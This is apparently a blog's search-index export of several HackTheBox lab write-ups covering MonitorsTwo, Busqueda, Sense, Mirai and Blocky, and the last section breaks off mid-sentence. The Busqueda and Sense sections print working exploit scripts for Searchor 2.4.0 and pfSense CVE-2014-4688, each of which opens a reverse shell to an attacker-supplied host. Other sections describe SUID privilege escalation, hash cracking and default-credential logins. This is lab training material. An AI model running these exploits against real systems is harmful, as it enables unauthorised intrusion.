[{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -sCV -p22,80 -oN nmap/monitorstwo 10.10.11.211 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. There are just two port opens which are SSH, HTTP. Based on the OpenSSH version, the target most likely running Ubuntu 20.04, codename Focal Fossa. I’m going to ignore port 22 which is SSH, since I don’t have any credentials. ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:1:0","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Http: Cacti Login So, I’m going to navigated to port 80 through my browser and I’ve been greeted with Cacti login page. As usual, I’ll tried a bunch of credentials combination such as admin:admin, admin:password, root:root and much more. Unfortunately, all of them were wrong. cacti login page ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:2:0","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Docker: foothold - CVE-2022-46169 Then, I realized on the login page. It’s showing the version number of this web application, which is Cacti v1.2.22. cacti version It’s appear to be vulnerable to unauthenticated RCE and it gets assign as CVE-2022-46169. Based on this description, RCE vulnerability happens in the remote_agent.php file. It exists due to insufficient authorization when handling HTTP requests with a custom Forwarded-For header. With quick googling, I managed to find an exploit about this particular version. Then I’m going to execute it, and it’s successfully executed. get the foothold Like always, I’m going to upgrade my reverse shell into full interactive and stabile. However, both of the python version did not exist on this machine. So, I’m going to upgrading using script. upgrade tty using script ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:3:0","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Docker: privesc - capsh After successfully upgrading my reverse shell. I’ll try to check the sudo permission with command sudo -l. Unfortunately, the sudo command did not exist on this machine. So, I’ll try to find any SUID binary that can be abused by execute this command find / -perm -u=s 2\u003e/dev/null. found suid capsh Luckly, the capsh was set into SUID binary and it is a tool that provides a handy wrapper for certain types of capability testing and environment creation. Then, I searching up on GTFOBins and managed to found this command to abused it. After successful execution, I manage to become a root user. rooted by capsh ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:3:1","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Docker: entrypoint.sh Unfortunately, I’m in docker container based on the .dockerenv file present. On top of that, my eyes managed to caught something interesting, it was a bash file named entrypoint.sh and it’s contains mysql command with plaintext credentials. rooted in docker read entrypoint file ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:3:2","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Docker: mysql So, I’ll try to log into mysql service with founded credentials above and it’s succeed. Then, with quick database enumeration, I found username along side with password hashes. found hashes in mysql Since I already have the hashes of the user. I’m going to crack it with john. Unfortunately, the admin hash did not cracked successfully. However, it managed to crack the other hash, which is marcus. john cracked hashes ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:3:3","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"SSH: marcus I successfully log into the machine via cracked credentials of the user called marcus through SSH. ssh as marcus I’m in as a marcus user. Like always, I’m going to check the sudo permission of this user with the command sudo -l. Turns out, this user cannot run as sudo on this machine. check sudo permission ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:4:0","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"SSH: docker version I really dumbfounded. Then, I’m thinking, if this machine has a docker inside it. It might worth checking the installed docker version with a simple command docker --version. check docker version ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:4:1","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"PrivEsc: CVE-2021-41091 Based on the version above. It seems this an old docker engine dated back to 2021. Then, I found this exploit on the internet and it gets assign CVE-2021-41091. Based on this description, it’s allow unprivileged users to traverse and execute programs within the data directory (typically /var/lib/docker) due to improperly restricted permissions. To exploit it successfully, first, I need to go back to shell that I have in docker container and setup /bin/bash as a SUID binary. setup bash as suid Then, I transfer this exploit into the machine that I have SSH into, and make it executable with command chmod +x. When everything already setup, finally, I can execute the exploit and it was successeded. Lastly, I’m going to change directory into vulnerable path and execute this command ./bin/bash -p and become root. transfer exploit into victim become true root ","date":"03-09-2023","objectID":"/posts/htb/monitorstwo/:5:0","tags":["CVE-2022-46169","CVE-2021-41091","upgrade-shell-using-script","rce","GTFOBins","capsh","mysql","john","docker"],"title":"HackTheBox - MonitorsTwo Writeup","uri":"/posts/htb/monitorstwo/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p22,80 -sCV -oN nmap/busqueda 10.10.11.208 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. There are just two port opens which are SSH, HTTP. Well, I’m going to ignore port 22 which is SSH, since I don’t have any credentials. On top of that, nmap also found the hostname called searcher.htb and I’m going to add that to the /etc/hosts file. add hostname in /etc/hosts ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:1:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Http: searcher.htb With that information in hand. I’ve navigated to port 80 through my browser and I’ve been greeted with this page. It’s a simple web application with a dropdown of search engine and an input prompt. searcher webpage At the bottom of this page. It shows the application name and the build version, which is Searchor 2.4.0 and it’s linking into this github repository. searchor version ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:2:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Foothold: Searchor 2.4.0 With a simple search on Google about this particular version. I came across this github repository which included the POC. Below is the vulnerable code that leads this exploit to work. It’s using the eval function and follow with {engine} and {query} as input. vulnerable code in github So, I make a simple exploit in python based on this POC by using python reverse shell as the payload. #!/usr/bin/env/python3 # Searchor 2.4.0 POC # Description: # https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b # https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/blob/main/README.md # https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-/tree/main # https://security.snyk.io/package/pip/searchor/2.4.0 import requests import sys #p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'} def send_req(url, ip, port): payload = \"', exec(\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\\\"))#\".format(ip, port) data = {'engine':'Accuweather','query':f'{payload}'} # requests.post(url, data=data, proxies=p) requests.post(url, data=data) if __name__==\"__main__\": try: url = sys.argv[1].strip() ip = sys.argv[2].strip() port = sys.argv[3].strip() except IndexError: print(\"[-] Usage: {} \u003curl\u003e \u003cattacker_ip\u003e \u003cattacker_port\u003e\".format(sys.argv[0])) print('[-] Example: {} \"http://example.com/search\" \"10.10.10.10\" \"1111\"'.format(sys.argv[0])) sys.exit(1) print(\"[!] Sending the payload...\") send_req(url, ip, port) ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:3:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Shell: svc Upon successfully executing the exploit. I’m in as a svc user and the best thing to do is upgrade my shell. On top of that, I’m in the /var/www/app directory. shell as svc While listing the /var/www/app directory. I found a hidden directory called .git and a config file in there. found config file in .git directory The config file, it’s contains the password of a user called cody and a subdomain called gitea. So, I added that into my /etc/hosts file. found cody credentials add gitea.searcher.htb in /etc/hosts ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:4:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Http: gitea.searcher.htb (cody) Then, I navigated through the browser and successfully login as cody. Unfortunately, there’s nothing that I found interesting. login as cody in gitea However, there are two users on it, which is the user that I used for login now and the administrator user. found administrator user in gitea Now, I’m curious to see if this user called cody exists on the box. So, I’ll check the user and found out, only two users that exit. check user exist on the box ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:5:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"SSH: svc From the nmap scan result above. It shows the port 22 which is SSH, and it’s open. Then, I’ll try the credentials that I found earlier alongside the svc user and it works. ssh as svc Since I have the password of this user. I’m going to check the sudo permission with the sudo -l command. Fair enough, I can run a python script that is located in the /opt directory called system-checkup.py. check sudo permission ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:6:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"SSH: system-checkup.py help When I ran it, it’s listing three possible commands that I could use. However, one of the commands which is full-checkup seems like not working or it’s just a print function. full-checkup not working ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:6:1","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"SSH: system-checkup.py docker-ps I executed the docker-ps command and it’s showing the docker process on the machine. Surprisingly, one of the docker containers was an image of the mysql database. I’ll try connecting to the mysql and it’s failed. system-checkup docker-ps ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:6:2","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"SSH: system-checkup.py docker-inspect When I executed the docker-inspect command, it throws an error that require some arguments. system-checkup docker-inspect So, I’m searching in the ocean of the internet and found this article that talks about this particular command which is docker-inspect. Then, I executed this command to dump the config file of the mysql database by appending the container id into it. dump mysql docker config Luckily, I found the admin credentials of the mysql database. However, when I’ll try to connect to it. It’s failed. So, I’m going to execute another command to show the docker ip address. found the docker ip address ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:6:3","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"SSH: mysql I managed to connect to it as the root user by supplying this ip address 172.19.0.3 as a host. Unfortunately, I can’t find anything that interesting, and feels like I’m stuck. connect to mysql as root ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:6:4","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Http: gitea.searcher.htb (administrator) Then, I’ll try all the credentials that I found earlier on any input that I can find. Luckily, I managed to log in as an administrator user on the gitea page. administrator gitea repository On top of that, administrator has a repository called scripts that contains a file called system-checkup.py and full-checkup.sh, which is svc user can execute it with sudo permission. ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:7:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Http: gitea.searcher.htb (full-checkup.sh) However, when I ran the full-checkup command earlier, it did not work and I thought maybe it was just a print function that got executed. So, I’ll check that file, and I was completely wrong. full-checkup source code ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:7:1","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Http: gitea.searcher.htb (system-chekup.py) I ended up checking the system-chekup.py source code and I spotted the problem in line 47. If the user supplies the full-checkup command, it’s going to execute a bash file named full-checkup.sh in the current directory. system-checkup source code To prove it, I’m going to execute the command in different directories. First, at the /home/svc/ directory, and second, it’s going to be in the /opt/scripts/ directory, where’s the scripts located. ran the script in the different directory ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:7:2","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"PrivEsc: system-checkup.py From the result above, I can create a malicious bash file called full-checkup.sh and execute with the sudo permission. I’m going to use a simple payload such as chmod +s /bin/bash, which is turn a /bin/bash binary into a Set UID binary. Then, I can execute as /bin/bash -p to get the root shell. becoming root ","date":"08-07-2023","objectID":"/posts/htb/busqueda/:8:0","tags":["python","mysql","gitea","rce","searchor 2.4.0","docker","docker-inspect"],"title":"HackTheBox - Busqueda Writeup","uri":"/posts/htb/busqueda/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p80,443 -sCV -oN nmap/sense 10.10.10.60 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_ssl-date: TLS randomness does not represent time |_http-title: Login | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 Well, only 2 ports are open, which is port 80 and 443. Based on the port and service itself, looks like I’m dealing with the webserver this time. However, the scan results show me that the url on port 80 has been redirected to port 443 which is the HTTPS port. ","date":"13-11-2022","objectID":"/posts/htb/sense/:1:0","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Https: Pfsense I’ve navigated to port 443 on my browser and accepted the SSL certificates. I’ll check the certificate and nothing useful for me. Turn’s out, it is a Pfsense login page. Then, I’ll try login in with the default credentials which is admin:pfsense and nothing unveil. By the look at the index page extension, this is a PHP webpage. pfsense login page ","date":"13-11-2022","objectID":"/posts/htb/sense/:2:0","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Gobuster Then, I run the gobuster to enumerate more on this webserver. Unfortunately, I can’t find anything useful and it’s just found empty directories. So, I ended up putting a bunch of extensions such as php,txt,html,cgi for the second scan, and it manage to find “gold”. gobuster ","date":"13-11-2022","objectID":"/posts/htb/sense/:2:1","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Https: /changelog.txt The first file that caught my attention is called changelog.txt. Upon expecting the file it says \"2 of 3 vulnerabilities have been patched\". This gives me an idea of this particular version having a severe flaw that hasn’t been patched. I have 1/3 luck here, to find which one of the flaws is. changelog.txt ","date":"13-11-2022","objectID":"/posts/htb/sense/:2:2","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Https: /system-users.txt Anyways, I’ve navigated to another text file called system-users.txt which leaks the username. However, the password says \"company defaults\". Then, it makes me think it could be the box name which is sense just like nibbles box that I did before, or the default Pfsense credentials which is pfsense. found username ","date":"13-11-2022","objectID":"/posts/htb/sense/:2:3","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Https: Pfsense/Dashboard I’ll try both credentials and the correct one is pfsense and it looks just like a generic pfsense dashboard, what do I expect :). However, it has the version number sitting in front of me which is 2.1.3-RELEASE. pfsense version ","date":"13-11-2022","objectID":"/posts/htb/sense/:2:4","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Foothold: CVE-2014-4688 Since this is an old box, I immediately find the exploit and cve with it. This vulnerability is assigned to CVE-2014-4688 and the description says \"this CVE assign to 3 vulnerabilty found in pfsense\". However, one of them did not patch as the changelog.txt file expose to me. Luckily, I find this exploit on exploit-db. Which explores the vulnerability in post-authentication in the status_rrd_graph_img.php page but again I want to be “l33t” and create my exploits by copying the existent exploits. (Why not? lol). Credited to Ryan McFarland aka absolomb and here are the results. #!/usr/bin/env python3 import sys import argparse import requests from bs4 import BeautifulSoup as bs from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) parser = argparse.ArgumentParser() parser.add_argument('-U', '--username', metavar='', help='Username') parser.add_argument('-P', '--password', metavar='', help='Password') parser.add_argument('-r', '--rhost', metavar='', help='Remote IP') parser.add_argument('-i', '--lhost', metavar='', help='Listening IP') parser.add_argument('-p', '--lport', metavar='', help='Listening port') args = parser.parse_args() def get_csrf(): req = requests.get(f\"https://{args.rhost}/index.php\", verify=False) soup = bs(req.text, features=\"lxml\") csrf = soup.find('input', {'name':'__csrf_magic'})['value'] return csrf def payload(ip, port): payload = \"\" command = f\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc {ip} {port} \u003e /tmp/f\" for char in command: payload += (\"\\\\\" + oct(ord(char)).lstrip(\"0o\")) return payload if __name__ == '__main__': try: s = requests.Session() csrf = get_csrf() payload = payload(args.lhost, args.lport) data = {'__csrf_magic':csrf, 'usernamefld':args.username, 'passwordfld':args.password, 'login':'Login'} req = s.post(f\"https://{args.rhost}/index.php\", data=data, verify=False) print(f\"LOGIN... {req.status_code}\") print(\"Trying to exploit...\") req = s.get(f\"https://{args.rhost}/status_rrd_graph_img.php?database=queues;printf+'{payload}'|sh\", verify=False) print(\"If you see this, it's doesn't work!\") except (KeyboardInterrupt, requests.exceptions.ConnectionError) as Error: sys.exit() shell as root BOOM! root baby! this is because firewall applications tend to be installed under root privilege. ","date":"13-11-2022","objectID":"/posts/htb/sense/:3:0","tags":["CVE-2014-4688","pfsense-default-creds","pfsense","gobuster","python","rce"],"title":"HackTheBox - Sense Writeup","uri":"/posts/htb/sense/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p22,53,80,1776,32400,32469 -sCV -oN nmap/mirai 10.10.10.48 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aaef5ce08e86978247ff4ae5401890c5 (DSA) | 2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA) | 256 b6a07838d0c810948b44b2eaa017422b (ECDSA) |_ 256 4d6840f720c4e552807a4438b8a2a752 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: lighttpd/1.4.35 1776/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd |_http-cors: HEAD GET POST PUT DELETE OPTIONS |_http-favicon: Plex | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Unauthorized 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. Looks like, I’m dealing with Debian (Jessie) machine based on the OpenSSH service banner. Since its have port 53 open, I’m going to add the hostname into the /etc/hosts file called mirai.htb (guessing). ","date":"02-11-2022","objectID":"/posts/htb/mirai/:1:0","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"Http: mirai.htb Upon navigating through the mirai.htb on my browser. I’ve been greeted by the \"Website Blocked\" page. However, at the bottom of this page, I can see it says Pi-hole with the version number. As far as I know, Pi-hole is commonly used in “homemade” VPNs that run on Raspberry Pi. main page ","date":"02-11-2022","objectID":"/posts/htb/mirai/:2:0","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"Http: pi.hole/admin By checking the page source code. I manage to find the hostname called pi.hole and I added it to my /etc/hosts file and also its have /admin directory. 44| \u003cscript src=\"http://pi.hole/admin/scripts/vendor/jquery.min.js\"\u003e\u003c/script\u003e So, I navigated to the /admin directory and was greeted with the Pi-hole page. I managed to find the login form by clicking Login on the left sidebar and I’ll try simple credentials such as admin:admin. Then, it spits out this error and simply says \"password is generated after installation and make sure to save it or it's too late\". Based on this error, I guess the password must be random and it’s impossible to guess it. login error ","date":"02-11-2022","objectID":"/posts/htb/mirai/:2:1","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"Foothold: SSH To be honest, I’m stuck at this point and clueless. Then, I realized something, this is a RaspberryPi. There are two ways, to interact with it either connect to monitor or SSH into it. Fortunately, with light googling, I managed to find the default SSH credentials. I’ll try it and BOOM! ssh in as pi ","date":"02-11-2022","objectID":"/posts/htb/mirai/:3:0","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"PrivEsc: Sudo I’m in as a pi user and the first thing I’ll check is the sudo permission with the command sudo -l. Surprisingly, this user has all access to everything and I ended up just running the command sudo su to get the root shell. change user to root ","date":"02-11-2022","objectID":"/posts/htb/mirai/:4:0","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"Flag: Root I’m so excited that I get the root shell. However, I was stunned when I’ll try to retrieve the root flag because the flag isn’t in that file at all but this message was. root flag deleted Upon reading that, I’ll check the devices that are connected to this machine with the lsblk command. Fair enough, I found the usb stick device that connected under /media/usbstick. So, I change the directory into it and it has two items in it. The first is the lost+found directory but unfortunately, it’s just an empty directory the other file damnit.txt has this message. cd usbstick damnit.txt Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back? -James Now, I’m really mad because why?? why!!!!!!! arggggg!!.. adkjlfhgasjkudfgjh *hahahaha* but when I’m thinking again it’s linux. Everything on linux is a file because of its nature of it. So, I’m thinking \"how I'm going to read this usb stick device\" then I remembered, I can use the strings command to display all the things human-readable. So, I’d ended up running strings on the partition itself /dev/sdb, and again BOOM! (double-BOOM!). real root flag *EVIL LAUGH* ","date":"02-11-2022","objectID":"/posts/htb/mirai/:4:1","tags":["raspberry-pi-default-creds-ssh","check-all-the-devices","pi-hole","usb-stick","recover-file","lsblk"],"title":"HackTheBox - Mirai Writeup","uri":"/posts/htb/mirai/"},{"categories":["HacktheBox"],"content":"Nmap Like always, I’m going to scan the IP address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p21,22,80,25565 -sCV -oN nmap/blocky 10.10.10.37 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://blocky.htb 25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel The nmap scan result is completed. Looks like, I’m dealing with an Ubuntu linux machine based on the OpenSSH service banner. On top of that, it’s running FTP, Apache, and Minecraft also based on my nmap scan it’s found a hostname called blocky.htb. So, I’m going to add that in my /etc/hosts file. add hostname /etc/hosts ","date":"22-10-2022","objectID":"/posts/htb/blocky/:1:0","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Http: blocky.htb I already add the IP address to the /etc/hosts file. So, I navigated to http://blocky.htb in my browser. It’s just a simple blog page titled BlockyCraft which is using WordPress because when I scrolled down at the bottom of it, it says “Proudly powered by WordPress”. Upon enumerating this website, I manage to find a single username called Notch aka Minecraft god. :) found notch user ","date":"22-10-2022","objectID":"/posts/htb/blocky/:1:1","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Http: /wp-admin Since this is a WordPress site and I already have a username. I navigate through the /wp-admin which is a login form for this cms. I’ll try a bunch of passwords and nothing useful came out of it. wordpress login page ","date":"22-10-2022","objectID":"/posts/htb/blocky/:1:2","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Gobuster Based on the extension of the index file. Turns out, it is a php webserver. Now, I’m going to run gobuster with the -x flag for looking up only the .php extension. To my surprise, it has a bunch of directories and files. However, the one that caught my eye is /phpmyadmin/. However, it required the credentials which I did not have on me. gobuster ","date":"22-10-2022","objectID":"/posts/htb/blocky/:1:3","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"Http: /plugins I ended up going through all the directories that gobuster found earlier. Fortunately, I managed to find the .jar file located in /plugins which is the first directory that I navigated to. So, I downloaded all the files into my current working directory. jar file at /plugins Based on the extension of the file, which is .jar, I’m firing up jd-gui to decompile those java files into human-readable. Shockingly, the file called BlockyCore.jar have hardcode credentials on it and with these credentials, I manage to login on to /phpmyadmin/ and change the notch user password. hardcode credentials in BlockyCore.jar ","date":"22-10-2022","objectID":"/posts/htb/blocky/:1:4","tags":["gobuster","wordpress","jd-gui","jar-file"],"title":"HackTheBox - Blocky Writeup","uri":"/posts/htb/blocky/"},{"categories":["HacktheBox"],"content":"SSH: Notch However, I can ssh into this machine with those 